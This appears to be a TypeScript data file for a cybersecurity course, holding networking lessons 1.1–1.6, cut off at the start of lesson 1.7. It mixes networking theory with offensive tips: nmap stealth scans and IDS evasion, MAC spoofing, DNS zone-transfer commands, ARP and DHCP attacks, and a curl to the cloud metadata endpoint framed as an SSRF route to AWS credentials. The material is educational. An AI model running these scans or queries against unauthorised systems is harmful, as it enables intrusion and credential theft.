import { RoadmapChapter } from "./types";

export const chapter1: RoadmapChapter =   {
    id: "ch-1-networking",
    chapterNumber: 1,
    title: "Computer Networking Mastery: Zero to Advanced",
    subtitle: "From 'What is a Computer Network?' to Packet Forensics, Protocols, Subnetting & Offensive Pivoting",
    badge: "Chapter 1 • Master Foundations",
    duration: "24 Hours • 9 In-Depth Lessons",
    difficulty: "Beginner",
    description:
      "You cannot compromise or defend what you do not understand. This comprehensive study curriculum starts from absolute zero ('What is a computer network?') and walks you step-by-step through network hardware, topologies, packet encapsulation, the OSI & TCP/IP models, binary subnetting, TCP/UDP mechanics, DNS, HTTP/1-2-3, Wireshark forensics, and advanced evasion.",
    iconName: "Globe",
    lessons: [
      {
        id: "l-1-1",
        lessonNumber: "1.1",
        title: "What is a Computer Network? Foundations, Types, Hardware & Topologies",
        duration: "2.5 Hours",
        badge: "Starting Point • Zero",
        summary:
          "The foundational starting point: What is a computer network, why devices connect, transmission media, geographical network classifications (LAN, WAN, MAN), network topologies (Star, Mesh, Bus), and the core hardware (Hubs, Switches, Routers, Firewalls) that makes the Internet function.",
        studyNotes: [
          {
            heading: "Core Network Definition & Fundamental Building Blocks",
            subheading: "What actually happens when two computing devices link together?",
            points: [
              "A Computer Network is defined as two or more computing devices (nodes or hosts) connected via a physical or wireless transmission medium to exchange data, share resources, and communicate protocols.",
              "Node (Host): Any device possessing a network interface card (NIC) capable of sending and receiving data — including laptops, servers, smartphones, IoT sensors, and network switches.",
              "Transmission Media: Guided media includes unshielded twisted pair (UTP Cat6 copper ethernet cables max 100m) and fiber optic cables (using total internal reflection of photons for multi-gigabit inter-datacenter links). Unguided media includes Wi-Fi (802.11 radio frequencies) and cellular links (4G/5G).",
              "Bandwidth vs. Latency: Bandwidth is the volume of data a pipe can transfer per second (e.g. 1 Gbps); Latency is the round-trip propagation delay required for a bit of data to travel from source to destination (measured in milliseconds ms).",
            ],
            callout: "In offensive cyber security, every single device with an IP address is an attack surface. Knowing which physical medium and interface a host uses dictates whether attacks like physical wiretapping, wireless deauthentication, or ARP spoofing are possible.",
            diagramOrCode: `+-------------------------------------------------------------+
|               ANATOMY OF A BASIC COMPUTER NETWORK           |
+-------------------------------------------------------------+
 [ Client PC ]                      [ Web Server ]
       |                                   |
   (Ethernet)                         (Fiber Optic)
       v                                   v
 [ Layer 2 Switch ] <---(Router)---> [ Layer 2 Switch ]
       ^                                   ^
   (Collision                         (Broadcast
    Domain 1)                          Domain 2)`
          },
          {
            heading: "Geographical Network Classification: PAN, LAN, WLAN, MAN & WAN",
            subheading: "How scale dictates architectural design and security trust boundaries",
            points: [
              "PAN (Personal Area Network): Under 10 meters, centered around an individual (Bluetooth headphones, smartwatch pairing). Highly vulnerable to bluebugging and bluesnarfing.",
              "LAN (Local Area Network): High-speed, low-latency private network confined to a single physical location (a home, school lab, or enterprise office building). Typically privately owned with zero ISP billing per packet.",
              "WLAN (Wireless Local Area Network): A LAN using IEEE 802.11 radio waves instead of cables. Protected by WPA2/WPA3 encryption handshakes.",
              "MAN (Metropolitan Area Network): Spans an entire city or university campus (often fiber rings owned by municipalities or consortiums).",
              "WAN (Wide Area Network): Spans countries or the globe. The Internet is the world's largest public WAN — an interconnected web of autonomous systems (AS) exchanging traffic via BGP routers.",
            ],
            callout: "Trust Boundaries: Security controls assume high trust inside a corporate LAN. Once an attacker gains a foothold inside a LAN (via phishing or Wi-Fi penetration), lateral movement is 100x easier because internal firewalls are often non-existent.",
          },
          {
            heading: "Network Topologies: How Nodes Connect",
            subheading: "Comparing Star, Mesh, Bus, and Ring topologies",
            points: [
              "Star Topology: Every node connects to a central hub or switch. If one cable breaks, only that node disconnects. However, the central switch is a Single Point of Failure (SPOF). Modern enterprise networks almost exclusively use Star/Extended Star.",
              "Mesh Topology: Every node has dedicated point-to-point connections to other nodes. Full Mesh formula: N*(N-1)/2 cables. Extremely expensive but provides ultimate redundancy. Used in nuclear facilities, ISP backbones, and military communications.",
              "Bus Topology (Legacy): Single shared coaxial backbone cable terminated at ends. High packet collision rate; any cable cut brings down the entire network. Used half-duplex CSMA/CD.",
              "Ring Topology (Legacy): Tokens circulate in a closed loop (e.g. Token Ring, FDDI). Deterministic latency but vulnerable to single-point loop disruptions.",
            ],
            diagramOrCode: `STAR TOPOLOGY (Modern Standard)       FULL MESH TOPOLOGY (High Redundancy)
          [Server]                                   [A] ------- [B]
             |                                        |  \\     /  |
    [PC 1]---[Switch]---[PC 2]                        |    \\ /    |
             |                                        |    / \\    |
          [PC 3]                                     [C] ------- [D]`
          },
          {
            heading: "Core Hardware Mechanics: Hub vs Switch vs Router vs Firewall",
            subheading: "Understanding the exact role of every device in a rack",
            points: [
              "Hub (Layer 1 - Physical): An unmanaged electronic repeater. When an electrical bit arrives at port 1, it blindly repeats it to all other ports. Has zero intelligence, creates massive collisions, and allows any connected user to sniff all neighbors' cleartext traffic.",
              "Switch (Layer 2 - Data Link): Intelligent hardware. Inspects incoming Ethernet frames for MAC addresses, builds a dynamic Content Addressable Memory (CAM) table, and forwards frames ONLY to the specific destination port.",
              "Router (Layer 3 - Network): Connects entirely different logical networks (subnets). Reads IP packet headers, maintains routing tables, decides optimal packet paths, and acts as the Default Gateway between a private LAN and the public Internet.",
              "Firewall (Layer 3/4/7): Network security gatekeeper. Inspects packets against security rule-sets (Access Control Lists - ACLs), tracks connection states (Stateful Inspection), and drops unauthorized ingress/egress connections.",
            ],
            callout: "Hacker Insight: If you plug Kali Linux into a legacy Hub, you can run Wireshark and see all passwords immediately. On a Switch, you only see your own traffic — UNLESS you execute an ARP Poisoning attack or CAM Table Flooding to force the switch into hub-mode!",
          },
          {
            heading: "Collision Domains vs. Broadcast Domains",
            subheading: "The fundamental rule of network traffic isolation",
            points: [
              "Collision Domain: A network segment where data packets can physically collide with each other when transmitted simultaneously. Every port on a Switch is its own separate collision domain (Full-Duplex eliminates collisions). Hubs place all ports in a single collision domain.",
              "Broadcast Domain: A network area where a broadcast frame (sent to MAC FF:FF:FF:FF:FF:FF or IP 255.255.255.255) is forwarded to every connected node. Switches extend broadcast domains; Routers break and isolate broadcast domains.",
            ],
            diagramOrCode: `HUB:    1 Big Collision Domain   |  1 Big Broadcast Domain
SWITCH: Each Port = 1 Collision |  1 Shared Broadcast Domain
ROUTER: Each Port = 1 Collision |  Breaks Broadcast Domains into Separate Subnets`
          },
        ],
        keyTopics: [
          "Differentiate PAN, LAN, WLAN, MAN, and WAN security boundaries",
          "Understand physical copper UTP vs fiber optic vs wireless transmission media",
          "Analyze Star vs Mesh vs Bus network topologies and Single Points of Failure",
          "Distinguish Hub (L1), Switch (L2), Router (L3), and Firewall (L3/4/7) hardware",
          "Master Collision Domains vs Broadcast Domains and how switches eliminate collisions",
        ],
        terminalCommands: [
          "ip link show",
          "ethtool eth0",
          "nmcli device status",
        ],
        proTips: [
          "When doing an internal physical red team engagement, always look for physical network drops in conference rooms; unmanaged ports often lead straight into the corporate LAN with zero 802.1X network access control!",
        ],
      },
      {
        id: "l-1-2",
        lessonNumber: "1.2",
        title: "How Data Travels: Packets, Frames, MAC Addresses & ARP Protocol",
        duration: "2.5 Hours",
        badge: "Data Link & ARP",
        summary:
          "How data physically travels across local links: The PDU encapsulation pipeline, 48-bit MAC addresses, OUI vendor prefixes, and how the Address Resolution Protocol (ARP) translates IPs to hardware — and why ARP's stateless design enables Man-In-The-Middle (MITM) attacks.",
        studyNotes: [
          {
            heading: "The Encapsulation & Decapsulation PDU Lifecycle",
            subheading: "Protocol Data Units (PDU): From human thought to copper voltage",
            points: [
              "When an application creates data, it travels down the networking stack. At each layer, header information is prepended — this process is called Encapsulation.",
              "Layer 7 (Application): Data (e.g. HTTP GET / HTTP/1.1)",
              "Layer 4 (Transport): Segment (TCP source & destination ports added)",
              "Layer 3 (Network): Packet (Source & destination IP addresses added)",
              "Layer 2 (Data Link): Frame (Source & destination MAC addresses added, plus CRC/FCS checksum trailer)",
              "Layer 1 (Physical): Bits (0s and 1s encoded into electrical voltages, light pulses, or radio waves)",
              "On the receiving computer, Decapsulation strips each header layer-by-layer until pure application data reaches the server process.",
            ],
            diagramOrCode: `[Application Data]                      -> Layer 7 (Data)
[TCP Header] + [Data]                   -> Layer 4 (Segment)
[IP Header] + [TCP] + [Data]            -> Layer 3 (Packet)
[Ethernet Header] + [IP] + [TCP] + [FCS]-> Layer 2 (Frame)
01101001 01101110 01110100             -> Layer 1 (Bits on wire)`
          },
          {
            heading: "MAC Addressing (Media Access Control) Architecture",
            subheading: "The permanent 48-bit physical identifier burned into NIC hardware",
            points: [
              "A MAC address consists of 48 bits (6 bytes), conventionally written in hexadecimal: 00:1A:2B:3C:4D:5E.",
              "OUI (Organizationally Unique Identifier): The first 24 bits (3 bytes) identify the hardware vendor (e.g. Apple, Cisco, Intel, Raspberry Pi) assigned by IEEE.",
              "NIC Specific: The last 24 bits (3 bytes) are uniquely assigned by the manufacturer.",
              "Unicast Address: Targeted to a single physical device.",
              "Multicast Address: Targeted to a group of devices subscribing to a multicast group (starts with 01:00:5E).",
              "Broadcast Address: Sent to all devices on the local segment (FF:FF:FF:FF:FF:FF).",
              "MAC Spoofing: While hardcoded in ROM, the operating system driver loads the MAC into RAM on boot; tools like `macchanger` can change your active MAC address in 1 second to bypass captive portals and MAC filters.",
            ],
          },
          {
            heading: "Address Resolution Protocol (ARP) Deep Dive",
            subheading: "How IP addresses are mapped to physical MAC addresses on a local subnet",
            points: [
              "Computers on a LAN cannot communicate using IP addresses alone; Ethernet frames require destination MAC addresses.",
              "ARP Request (Broadcast): Computer A wants to send data to 192.168.1.100. It broadcasts: 'Who has 192.168.1.100? Tell 192.168.1.50 (MAC A)'. All devices on the switch receive this.",
              "ARP Reply (Unicast): Device with IP 192.168.1.100 replies directly to MAC A: '192.168.1.100 is at 00:11:22:33:44:55'.",
              "ARP Cache: Both machines cache this mapping in their local ARP table (`arp -a`) to avoid broadcasting for every packet.",
            ],
            callout: "The Fatal Security Flaw in ARP: ARP was created in 1982 with ZERO authentication. Any computer can send an unsolicited ARP Reply ('Gratuitous ARP') saying 'I am the default gateway!', and the victim will overwrite its ARP cache immediately without checking if it asked for it!",
            diagramOrCode: `ARP SPOOFING / MAN-IN-THE-MIDDLE (MITM)
[Victim 192.168.1.50]           [Gateway 192.168.1.1]
         \\                         /
          \\                       /
    "192.168.1.1 is at ATTACKER" "192.168.1.50 is at ATTACKER"
            v                   v
              [ ATTACKER MACHINE ]
           (Intercepts & Sniffs All Data)`
          },
        ],
        keyTopics: [
          "Understand the 5-step Encapsulation / Decapsulation lifecycle (Data -> Segment -> Packet -> Frame -> Bits)",
          "Anatomy of 48-bit MAC addresses and vendor identification via IEEE OUI",
          "Differentiate Unicast, Multicast, and Broadcast (FF:FF:FF:FF:FF:FF) transmissions",
          "Analyze ARP Request broadcast and ARP Reply unicast exchange mechanics",
          "Understand the stateless flaw of ARP caching and how ARP Spoofing enables MITM attacks",
        ],
        terminalCommands: [
          "ip neigh show",
          "arp -a",
          "sudo macchanger -s eth0",
          "sudo macchanger -r eth0",
        ],
        proTips: [
          "On modern enterprise Wi-Fi networks with Client Isolation enabled, stations cannot talk directly to each other, which stops basic ARP poisoning. Always verify if client-to-client traffic is permitted before attempting local MITM attacks.",
        ],
      },
      {
        id: "l-1-3",
        lessonNumber: "1.3",
        title: "OSI 7-Layer Model vs TCP/IP Protocol Stack (Layer-by-Layer Attack Surfaces)",
        duration: "3 Hours",
        badge: "Model Architecture",
        summary:
          "The comprehensive blueprint of computer communications: Layer-by-layer exploration of all 7 OSI layers, comparison with the TCP/IP stack, and the specific offensive cyber security attack surfaces targeting each layer.",
        studyNotes: [
          {
            heading: "Why We Need Layered Network Models",
            subheading: "Modularity, protocol independence, and systematic troubleshooting",
            points: [
              "Layering allows software developers and network engineers to develop applications without worrying about physical transmission media (e.g. your browser works identically over Wi-Fi, Ethernet, or 5G).",
              "OSI (Open Systems Interconnection) is a 7-layer theoretical conceptual model designed by ISO.",
              "TCP/IP (Department of Defense DoD Model) is the practical 4-layer (or 5-layer) implementation that powers the actual Internet today.",
            ],
          },
          {
            heading: "The 7 Layers of the OSI Model: Breakdown & Function",
            subheading: "From Physical Layer 1 to Application Layer 7",
            points: [
              "Layer 1 - Physical: Transmits unformatted raw bitstreams over physical media (voltages, light pulses, cables, repeaters, NIC transceivers).",
              "Layer 2 - Data Link: Responsible for node-to-node hop delivery across the local link. Frame framing, MAC addressing, error checking via CRC, flow control. Protocols: Ethernet (IEEE 802.3), Wi-Fi (802.11), PPP, ARP.",
              "Layer 3 - Network: Responsible for end-to-end routing across multiple interconnected networks. Logical IP addressing, packet fragmentation, routing tables. Protocols: IPv4, IPv6, ICMP, IPsec, OSPF, BGP.",
              "Layer 4 - Transport: Responsible for process-to-process data transfer, port multiplexing, and connection reliability. Protocols: TCP (reliable, ordered, connection-oriented) and UDP (unreliable, fast, connectionless).",
              "Layer 5 - Session: Establishes, manages, and terminates dialogues between local and remote applications. Controls simplex, half-duplex, and full-duplex sessions (RPC, NetBIOS, SOCKS).",
              "Layer 6 - Presentation: Translates data between application formats and network formats. Handles character encoding (ASCII, UTF-8), data compression (gzip), and cryptographic encryption/decryption (TLS/SSL).",
              "Layer 7 - Application: Closest to the end user. Interfaces directly with user software applications. Protocols: HTTP, HTTPS, DNS, SSH, FTP, SMTP, IMAP, DHCP.",
            ],
            diagramOrCode: `+-------------------------------------------------------------+
|               OSI 7-LAYER VS TCP/IP PROTOCOL STACK          |
+-------------------------------------------------------------+
   OSI 7-LAYER MODEL               TCP/IP 4-LAYER MODEL
7. Application     \\
6. Presentation     > --------->   Application Layer (HTTP, DNS, SSH)
5. Session         /
4. Transport       ----------->   Transport Layer (TCP, UDP)
3. Network         ----------->   Internet Layer (IP, ICMP, ARP)
2. Data Link       \\
1. Physical         > --------->   Network Access / Link Layer (Ethernet)`
          },
          {
            heading: "Offensive Attack Surfaces at Every Single OSI Layer",
            subheading: "Where vulnerabilities reside across the entire stack",
            points: [
              "Layer 1 Attacks: Cable tapping, Rogue Wi-Fi Access Points (Evil Twin), RF Jamming, Hardware keyloggers, BadUSB.",
              "Layer 2 Attacks: ARP Poisoning, CAM Table Overflow (flooding switch memory with bogus MACs to force it into hub mode), VLAN Hopping, DHCP Starvation.",
              "Layer 3 Attacks: IP Spoofing, ICMP Redirect attacks, Ping of Death, BGP Route Hijacking, Smurf attacks.",
              "Layer 4 Attacks: TCP SYN Flood (resource exhaustion), Port Scanning (SYN, Connect, Xmas), Session Hijacking, TCP Sequence Number Prediction.",
              "Layer 5 Attacks: Session fixation, Token hijacking, RPC exploitation, SMB Relay attacks.",
              "Layer 6 Attacks: TLS Downgrade attacks (POODLE, FREAK), SSL Stripping, Heartbleed (OpenSSL memory leak).",
              "Layer 7 Attacks: SQL Injection, Cross-Site Scripting (XSS), Server-Side Request Forgery (SSRF), Authentication bypass, API flaws, HTTP Request Smuggling.",
            ],
            callout: "Over 80% of modern web bug bounty rewards are earned at Layer 7 (Application Layer). However, without understanding Layers 1–4, an attacker will be blind when firewalls, proxies, rate limits, or packet filters block their exploits!",
          },
        ],
        keyTopics: [
          "Master all 7 layers of OSI (Physical, Data Link, Network, Transport, Session, Presentation, Application)",
          "Map OSI 7-layer concepts to practical TCP/IP 4-layer / 5-layer architecture",
          "Identify specific protocols operating at each layer (HTTP, TCP, IP, Ethernet)",
          "Analyze offensive vulnerabilities and attack surfaces present at every single layer",
          "Understand how security controls (Firewalls, IDS, WAFs) inspect different layers",
        ],
        terminalCommands: [
          "sudo tcpdump -i eth0 -n -c 10",
          "netstat -tulnp",
          "ss -tulpn",
        ],
        proTips: [
          "When an exploit fails, troubleshoot down the OSI stack: Can you ping the IP (Layer 3)? Is the port open (Layer 4)? Is the TLS handshake negotiating (Layer 6)? Is the HTTP payload valid (Layer 7)? This systematic mindset separates amateurs from master penetration testers.",
        ],
      },
      {
        id: "l-1-4",
        lessonNumber: "1.4",
        title: "IP Addressing, Binary Math, Subnetting & CIDR Demystified",
        duration: "3 Hours",
        badge: "IP Math & Routing",
        summary:
          "IPv4 32-bit architecture, binary octets, subnet masks, CIDR prefix notation (/24, /28, /30), calculating usable host ranges, RFC 1918 private scopes, cloud metadata link-local endpoints, and IPv6 essentials.",
        studyNotes: [
          {
            heading: "Anatomy of an IPv4 Address & Binary Octets",
            subheading: "Understanding 32-bit binary addresses behind dotted-decimal notation",
            points: [
              "An IPv4 address consists of 32 bits arranged in 4 groups of 8 bits (called Octets), separated by periods.",
              "Example: 192.168.1.1 in binary is 11000000.10101000.00000001.00000001.",
              "Each 8-bit octet can represent numbers from 0 (00000000) to 255 (11111111). Total theoretical IPv4 address space: 2^32 = 4,294,967,296 addresses.",
              "Every IP address is divided into two logical portions: Network ID (identifies which network you are on) and Host ID (identifies your specific computer on that network). The Subnet Mask determines where the Network portion ends and the Host portion begins.",
            ],
          },
          {
            heading: "Subnet Masks & CIDR (Classless Inter-Domain Routing) Explained",
            subheading: "Why /24, /16, and /8 notation replaced outdated Class A, B, and C networks",
            points: [
              "In binary, a Subnet Mask consists of contiguous 1s for the network bits, followed by contiguous 0s for the host bits.",
              "Subnet Mask 255.255.255.0 = 24 contiguous ones (11111111.11111111.11111111.00000000) -> Written in CIDR slash notation as `/24`.",
              "Formula for Total IP Addresses: 2^(number of host bits 0s). For /24: 2^8 = 256 addresses.",
              "Formula for Usable Host IPs: 2^(host bits) - 2. Why minus 2? Because the FIRST IP is reserved as the Network ID, and the LAST IP is reserved as the Broadcast ID.",
              "Common Subnets: /24 = 254 usable hosts; /28 = 14 usable hosts (often used for small DMZs); /30 = 2 usable hosts (used for point-to-point router links); /16 = 65,534 usable hosts (enterprise campus networks).",
            ],
            diagramOrCode: `+-------------------------------------------------------------+
|                 COMMON CIDR SUBNET CHEAT SHEET              |
+-------------------------------------------------------------+
 CIDR   Subnet Mask        Total IPs   Usable Hosts   Use Case
 /30    255.255.255.252    4           2              Point-to-Point Link
 /29    255.255.255.248    8           6              Small Server Pod
 /28    255.255.255.240    16          14             Isolated DMZ
 /24    255.255.255.0      256         254            Standard Office LAN
 /16    255.255.0.0        65,536      65,534         Large Enterprise HQ`
          },
          {
            heading: "RFC 1918 Private Ranges & Special Reserved IPs",
            subheading: "The non-routable IP spaces that every security researcher must memorize",
            points: [
              "Because IPv4 addresses ran out, RFC 1918 designated 3 blocks of Private IP addresses that routers on the public Internet will never route:",
              "Class A Private: 10.0.0.0 to 10.255.255.255 (/8 prefix, ~16.7 million addresses) — standard in AWS VPCs and massive enterprise networks.",
              "Class B Private: 172.16.0.0 to 172.31.255.255 (/12 prefix, ~1 million addresses) — used heavily in Docker container networks and VPN pools.",
              "Class C Private: 192.168.0.0 to 192.168.255.255 (/16 prefix, 65,536 addresses) — typical home routers and small branch offices.",
              "Loopback Range: 127.0.0.0/8 (commonly 127.0.0.1 - 'localhost'). Stays entirely within the OS networking stack without touching physical wire.",
              "APIPA (Automatic Private IP Addressing): 169.254.0.0/16. Automatically assigned by Windows/macOS when no DHCP server responds.",
              "Cloud Metadata Endpoint: 169.254.169.254. Link-local address used by AWS EC2, GCP, and Azure to provide instance metadata, IAM credentials, and API keys — the premier target in Server-Side Request Forgery (SSRF) exploits!",
            ],
            callout: "When hunting bug bounties, discovering an SSRF vulnerability that can reach http://169.254.169.254/latest/meta-data/iam/security-credentials/ allows you to dump AWS temporary secret keys, yielding Critical ($5,000–$25,000) payouts!",
          },
        ],
        keyTopics: [
          "Convert 32-bit IPv4 addresses between decimal notation and binary octets",
          "Calculate Network Address, Broadcast Address, and Usable Host Range using subnet masks",
          "Memorize CIDR prefix notations: /8, /16, /24, /28, /30",
          "Identify RFC 1918 private ranges: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16",
          "Analyze cloud metadata link-local address 169.254.169.254 in offensive SSRF scenarios",
        ],
        terminalCommands: [
          "ipcalc 192.168.1.50/24",
          "ip route show",
          "curl -s http://169.254.169.254/latest/meta-data/",
        ],
        proTips: [
          "Always check internal IP leakage in HTTP response headers (e.g. `X-Backend-Server: 10.0.4.12` or in error stack traces). Knowing an enterprise's internal IP scheme allows targeted SSRF forging.",
        ],
      },
      {
        id: "l-1-5",
        lessonNumber: "1.5",
        title: "Ports, Sockets & Transport Protocols: TCP vs UDP Deep Dive",
        duration: "3 Hours",
        badge: "Transport Mastery",
        summary:
          "Transport layer mechanics: What is a port and socket, the 3-Way Handshake, TCP state machine, teardown, TCP flags (SYN, ACK, FIN, RST, PSH, URG), Nmap port scanning mechanics (-sS, -sT, -sX), and connectionless UDP amplification attacks.",
        studyNotes: [
          {
            heading: "What is a Port & Socket? The Logical Apartment Analogy",
            subheading: "How an operating system routes packets to the correct application process",
            points: [
              "IP addresses identify the computer (like the street address of an apartment building). Port numbers identify the specific application service running inside that computer (like apartment room numbers).",
              "A Socket is the combination of an IP Address and a Port number, denoted as `IP:Port` (e.g. `192.168.1.50:443`).",
              "Total Port Range: 16-bit field allows ports from 0 to 65,535.",
              "Well-Known Ports (0 – 1023): Reserved for privileged system services (HTTP 80, HTTPS 443, SSH 22, DNS 53, FTP 21, Telnet 23, SMTP 25). Requiring root/admin privileges to bind on Unix.",
              "Registered Ports (1024 – 49151): Assigned by IANA for specific vendor services (MySQL 3306, PostgreSQL 5432, RDP 3389, Redis 6379, MongoDB 27017).",
              "Dynamic / Ephemeral Ports (49152 – 65535): Temporarily assigned by the client OS for outbound connections and released upon session termination.",
            ],
          },
          {
            heading: "TCP (Transmission Control Protocol) Internals & 3-Way Handshake",
            subheading: "Reliable, ordered, error-checked byte stream communication",
            points: [
              "TCP guarantees delivery: packets are tracked by sequence numbers, acknowledged by the receiver, retransmitted if lost, and reassembled in proper order.",
              "The TCP 3-Way Handshake (Connection Establishment):",
              "Step 1: Client -> Server: Sends SYN packet with initial sequence number (ISN) Client_Seq = X. Client enters `SYN_SENT` state.",
              "Step 2: Server -> Client: Server responds with SYN-ACK packet with Server_Seq = Y, and Ack_Seq = X + 1. Server enters `SYN_RECEIVED` state.",
              "Step 3: Client -> Server: Client replies with ACK packet with Ack_Seq = Y + 1. Connection established! Both enter `ESTABLISHED` state.",
              "Connection Teardown (Graceful 4-way close): Host A sends FIN -> Host B sends ACK -> Host B sends FIN -> Host A sends ACK.",
              "Abrupt Teardown: If a packet hits a closed port, or a connection needs immediate aborting, a RST (Reset) packet is sent.",
            ],
            diagramOrCode: `+-------------------------------------------------------------+
|                  THE TCP 3-WAY HANDSHAKE (SYN-ACK)          |
+-------------------------------------------------------------+
   CLIENT                                         SERVER
   [CLOSED]                                      [LISTEN]
      |                                              |
      |  ------ SYN (Seq=X) ---------------------->  | [SYN_RCVD]
      |                                              |
      |  <----- SYN-ACK (Seq=Y, Ack=X+1) ----------  |
      |                                              |
[ESTABLISHED] -- ACK (Ack=Y+1) ------------------->  | [ESTABLISHED]
      |                                              |
      | <====== FULL-DUPLEX ENCRYPTED/PLAIN DATA ===> |`
          },
          {
            heading: "Nmap Port Scanning Mechanics: What the Flags Actually Do",
            subheading: "How offensive scanners abuse TCP state machine anomalies",
            points: [
              "TCP SYN Stealth Scan (`nmap -sS`): Sends SYN. If port is OPEN, server replies SYN-ACK. Nmap immediately sends RST to kill the session BEFORE completing the 3rd handshake step! Why? Because the application server never logs a connection that never finished establishing.",
              "TCP Connect Scan (`nmap -sT`): Completes the full 3-way handshake via the OS `connect()` API. Leaves full log traces in application servers. Used when the attacker has no raw root socket privileges.",
              "Xmas Scan (`nmap -sX`): Sets FIN, PSH, and URG flags ('lit up like a Christmas tree'). Under RFC 793, open ports ignore malformed packets, while closed ports reply with RST. Fails against Windows boxes because Microsoft does not follow RFC 793.",
              "UDP Scanning (`nmap -sU`): Since UDP has no handshake, Nmap sends empty UDP packets. If no response arrives, Nmap flags the port as `open|filtered`. If the port is closed, the target OS sends an ICMP Type 3 Code 3 (Port Unreachable) packet.",
            ],
            callout: "Port scanning is the very first thing an intrusion detection system (IDS/IPS) detects. Using rate limits (`--max-rate 50`), randomized port order, and timing templates (`-T2` or `-T3`) helps avoid triggering automated IP bans.",
          },
        ],
        keyTopics: [
          "Understand Port ranges: Well-Known (0-1023), Registered (1024-49151), and Ephemeral (49152-65535)",
          "Dissect the TCP 3-Way Handshake step-by-step (SYN -> SYN-ACK -> ACK)",
          "Memorize the 6 core TCP Flags: SYN, ACK, FIN, RST, PSH, and URG",
          "Analyze how Nmap SYN Stealth Scanning (-sS) evades application-layer logging",
          "Differentiate UDP connectionless mechanics and why UDP scans are slow due to ICMP rate-limiting",
        ],
        terminalCommands: [
          "sudo nmap -sS -Pn -p 22,80,443,3306,8080 target.com",
          "sudo nmap -sT -p 80 target.com",
          "ss -ant state established",
        ],
        proTips: [
          "Never scan only the top 1000 ports on an enterprise penetration test. Development teams frequently move sensitive admin panels, Jenkins instances, or debug APIs to high ports like 8080, 8443, 8888, 9000, or 27017 to hide from default scans.",
        ],
      },
      {
        id: "l-1-6",
        lessonNumber: "1.6",
        title: "Core Network Services: DNS, DHCP, NAT & Routing Architecture",
        duration: "3 Hours",
        badge: "Network Services",
        summary:
          "The critical services that keep the internet functioning: DNS resolution hierarchy and zone transfers, DHCP DORA allocation and starvation attacks, NAT traversal (SNAT, DNAT, PAT), and Default Gateway routing.",
        studyNotes: [
          {
            heading: "DNS (Domain Name System) Architecture & Resolution Chain",
            subheading: "The global distributed database that translates human names into IP addresses",
            points: [
              "When you type `sub.example.com` into your browser, the resolution chain works recursively:",
              "1. Local Cache: Browser checks its DNS cache, then OS hosts file (`/etc/hosts`).",
              "2. Recursive Resolver: Queries your configured DNS server (e.g. ISP or Google `8.8.8.8`).",
              "3. Root Nameservers: 13 global root IP server clusters (`.` designated A through M) direct the resolver to the TLD nameserver.",
              "4. TLD Nameservers: Responsible for Top-Level Domains (`.com`, `.org`, `.net`, `.in`). Directs resolver to the authoritative nameserver.",
              "5. Authoritative Nameserver: The master server for `example.com` (e.g. Cloudflare, Route 53) that returns the final A record IP address.",
            ],
            diagramOrCode: `+-------------------------------------------------------------+
|                 DNS HIERARCHY RESOLUTION CHAIN              |
+-------------------------------------------------------------+
 [ Client ] ---> [ Recursive Resolver (8.8.8.8) ]
                         |
                 1. Queries Root Nameserver (".")
                         v
                 2. Queries TLD Nameserver (".com")
                         v
                 3. Queries Authoritative Nameserver ("example.com")
                         v
                Returns IP: 93.184.216.34`
          },
          {
            heading: "Critical DNS Record Types & Offensive Reconnaissance",
            subheading: "Mapping an organization's complete digital infrastructure via DNS",
            points: [
              "A Record: Maps hostname to IPv4 address (e.g. `api.target.com -> 104.20.10.5`).",
              "AAAA Record: Maps hostname to 128-bit IPv6 address.",
              "CNAME (Canonical Name): Alias pointing to another domain (e.g. `shop.target.com -> target.myshopify.com`). If the target service is deleted but the CNAME remains, an attacker can register the name and achieve Subdomain Takeover!",
              "MX Record: Mail Exchange servers handling organization email (points to Google Workspace, Microsoft 365, Proofpoint).",
              "TXT Record: Arbitrary text; stores SPF (Sender Policy Framework) and DKIM keys to prevent email spoofing, as well as cloud ownership verification tokens.",
              "NS (Nameserver): Identifies which servers host the authoritative zone for the domain.",
              "AXFR (DNS Zone Transfer): Designed for nameservers to replicate zone files. If misconfigured to allow public queries, an attacker can dump every single internal subdomain, staging server, and private IP in one command!",
            ],
            callout: "Always test `dig axfr target.com @ns1.target.com`. If zone transfer is open, you get the company's entire asset inventory with zero brute-forcing. This is an instant P2/P3 bug bounty finding.",
          },
          {
            heading: "DHCP (Dynamic Host Configuration Protocol) & DORA Process",
            subheading: "Automating network configuration for joining devices",
            points: [
              "The DORA Process:",
              "`D`iscover (Broadcast): New client broadcasts 'I need an IP address!' to 255.255.255.255.",
              "`O`ffer (Unicast/Broadcast): DHCP server offers an available IP lease with subnet mask and lease time.",
              "`R`equest (Broadcast): Client accepts the offer and requests the lease.",
              "`A`cknowledge (Unicast): Server confirms the lease, providing Default Gateway and DNS servers.",
              "DHCP Starvation Attack: An attacker floods the network with thousands of fake MAC addresses requesting IPs until the DHCP pool is completely exhausted, denying service to legitimate machines.",
              "Rogue DHCP Server: Attacker sets up their own rogue DHCP server to respond faster than the real one, handing out the attacker's machine as the Default Gateway and DNS server for total traffic interception.",
            ],
          },
          {
            heading: "NAT (Network Address Translation) & PAT Port Forwarding",
            subheading: "How thousands of private LAN devices share a single public IP",
            points: [
              "Because IPv4 addresses are scarce, routers use NAT to translate private RFC 1918 IPs into a single registered Public IP address when traffic enters the Internet.",
              "SNAT (Source NAT): Rewrites the private source IP of outbound client requests into the router's public IP.",
              "DNAT (Destination NAT / Port Forwarding): Rewrites the public destination IP of inbound packets so traffic on port 80/443 reaches an internal private server.",
              "PAT (Port Address Translation / NAT Overload): Multiplexes thousands of internal devices onto a single public IP by translating both IP addresses AND source port numbers.",
              "Hacker Implication: NAT prevents direct inbound connections from the Internet to a target machine. That is why attackers use Reverse Shells (where the victim initiates the outbound connection to the attacker's public VPS listener) rather than Bind Shells!",
            ],
          },
        ],
        keyTopics: [
          "Trace the complete DNS recursive resolution path from Root (.) to Authoritative NS",
          "Identify critical DNS records: A, AAAA, CNAME, MX, TXT, NS, PTR, and SOA",
          "Execute and analyze DNS Zone Transfer (AXFR) misconfigurations",
          "Understand the DHCP DORA process and rogue DHCP gateway attacks",
          "Master NAT vs PAT mechanics and why penetration testers rely on Reverse Shells",
        ],
        terminalCommands: [
          "dig A target.com +trace",
          "dig any target.com @8.8.8.8",
          "dig axfr target.com @ns1.target.com",
          "host -t mx target.com",
        ],
        proTips: [
          "Look closely at TXT records during initial recon. Companies frequently leave forgotten verification tokens from Canva, Atlassian, Google, or Mailgun, which confirm the exact cloud SaaS stack the company runs.",
        ],
      },
      {
        id: "l-1-7",
